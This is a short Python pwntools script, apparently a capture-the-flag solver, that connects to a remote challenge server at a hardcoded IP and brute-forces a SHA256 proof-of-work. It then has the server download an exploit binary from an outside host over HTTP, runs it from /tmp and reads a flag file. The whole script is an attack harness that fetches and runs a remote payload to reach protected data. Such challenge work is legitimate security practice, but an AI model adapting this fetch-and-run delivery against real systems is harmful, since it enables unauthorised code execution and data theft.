from pwn import *

r = remote("173.249.194.251", 13370)

def solve_pow(prefix, difficulty):
    print(f"[+] Solving PoW: SHA256(prefix + answer) starts with {'0' * difficulty}")
    i = 0
    while True:
        answer = str(i)
        digest = hashlib.sha256((prefix + answer).encode()).hexdigest()
        if digest.startswith('0' * difficulty):
            print(f"[+] Found answer: {answer}")
            print(f"[+] Hash: {digest}")
            return answer
        i += 1

exploit_url = b"http://173.249.194.251:8000/exploit"

r.recvuntil(b"[+] Prefix: ")
prefix = r.recvline().strip().decode()

answer = str(solve_pow(prefix, 6)).encode()
r.sendlineafter(b"[!] Your Answer : ", answer)
r.sendlineafter(b"NEED_UPLOAD_EXPLOIT (y/n)", b"y")
r.sendlineafter(b"[!] Input your exploit url : ", exploit_url)

r.sendlineafter(b"~ $ ", b"/tmp/e")
r.sendlineafter(b"~ $ ", b"cat /tmp/flag")

r.interactive()
